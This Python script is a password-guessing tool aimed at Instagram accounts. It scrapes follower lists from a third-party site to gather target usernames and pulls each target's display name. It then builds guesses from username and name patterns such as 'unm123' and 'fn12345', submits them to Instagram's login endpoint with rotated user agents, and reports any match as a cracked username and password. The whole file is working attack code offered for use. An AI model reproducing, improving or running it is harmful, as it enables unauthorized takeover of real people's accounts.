# encoding: utf-8
import requests,json,random,time
from bs4 import BeautifulSoup as parser
#cj = cookielib.LWPCookieJar()
listak=[]
passlist2=["unm","unm123","ln12345","ln123","unm12345","password","fn12345","fn123","fnln"]
passlist3=["unm","unm123","ln12345","ln123","unm12345","password","fn12345","fn123","fnln","fnmnln","fnln123","fnmn123","fnmnln123"]
passlist1=["unm","unm123","fn123","fn12345","unm12345","fn"]
passlist=["unm","unm123","unm12345"]
uag = open('ua.txt','r').read()

def login(uname,pw):
	ig = 'https://www.instagram.com'
	log_ig = ig + '/accounts/login/ajax/'
	headers = {'User-Agent': random.choice(uag.split("\n"))}
	s = requests.Session()
	s.headers = headers
	s.headers.update({'Referer': ig})
	r = s.get(ig)
	s.headers.update({'X-CSRFToken': r.cookies['csrftoken']})
	data = {'username':uname,  'password':pw}
	login = s.post(log_ig, data=data, allow_redirects=True)
	s.headers.update({'X-CSRFToken': login.cookies['csrftoken']})
	j = json.loads(login.text)
	try:
		return j["authenticated"]
	except:
		return j["message"]

def getpage(yurl):
	while True:
		prs=requests.get(yurl,headers={"User-Agent":random.choice(uag.split("\n"))}).text
		pr = parser(prs,"html.parser")
		if "Next page" in (prs):
			return str(pr.find("a",title="Next page")["href"])
		elif "Something went wrong" in (prs):
			pass
		else:
			return False


def get_followers(usr="",all=False,max=100):
	url = 'http://insusers.com/'
	geturl=url+usr+"/followers"
	rt = []
	if all == True:
		max = 100000000
	while True:
		try:
			r=requests.get(geturl,headers={"User-Agent":random.choice(uag.split("\n"))}).text
			break
		except requests.exceptions.ConnectionError:
			pass
	while True:
		b = parser(r, 'html.parser')
		bc = b.find_all("a",class_="text-dark")
		if "Next page" in r:
			next = geturl+getpage(geturl)
			break
		elif "Something went wrong" in r:
			r=requests.get(geturl,headers={"User-Agent":random.choice(uag.split("\n"))}).text
		else:
			next = False
			break

	for azb in bc:
		rt.append(str(azb["href"].replace("/","")))

	while len(rt) < max:
		if next == False:
			break
		while True:
			try:
				r2=requests.get(next,headers={"User-Agent":random.choice(uag.split("\n"))}).text
				if "Next page" in r2:
					break
			except requests.exceptions.ConnectionError:
				pass
		while True:
				b2 = parser(r2,"html.parser")
				bc2 = b2.find_all("a",class_="text-dark")
				if "Next page" in r2:
					next = geturl+getpage(next)
					break
				if "Something went wrong" in r2:
					r2=requests.get(next,headers={"User-Agent":random.choice(uag.split("\n"))}).text
		for i2 in bc2:
			if len(rt) < max:
				cok = str(i2["href"].replace("/",""))
				if cok not in rt:
					rt.append(cok)
			else:
				return rt
				break
	return rt

def get_name(user):
	while True:
		try:
			az = requests.get("https://www.instagram.com/"+user+"/").text
			break
		except:
			pass
	parse = parser(az,"html.parser")
	ab = parse.find("title").string
	ab = ab.replace("\n","").split("@")[0].replace(" (","")
	return ab

def smartcrack(unem=""):
	if unem == "":
		return
	getname=get_name(unem)
	namae=getname.replace(" ","_").split("_")
	if len(namae) == 1:
		pd=passlist1
	elif len(namae) == 2:
		pd=passlist2
	elif len(namae) == 3:
		pd=passlist3
	else:
		pd=passlist
	for i2 in pd:
		passlur=i2.replace("unm",unem)
		if len(namae) > 2:
			passlur=passlur.replace("fn",namae[0]).replace("mn",namae[1]).replace("ln",namae[2])
		elif len(namae) > 1:
			passlur = passlur.replace("fn",namae[0]).replace("mn",namae[1])
		elif len(namae) == 1:
			passlur = passlur.replace("fn",namae[0])
		try:
			azuuu=login(unem,passlur)
			if azuuu == True:
				return 'username : '+unem+"\npassword : "+passlur+"\nSukses"
			else:
				return 0
		except:
			pass
	return False




def search(name):
	rr=requests.get('https://www.instagram.com/web/search/topsearch/?context=blended&query='+name)
	rq=json.loads(rr.text)
	rslt=[]
	for i in rq['users']:
		nama=i['user']['username']
		rslt.append(nama)
	return rslt
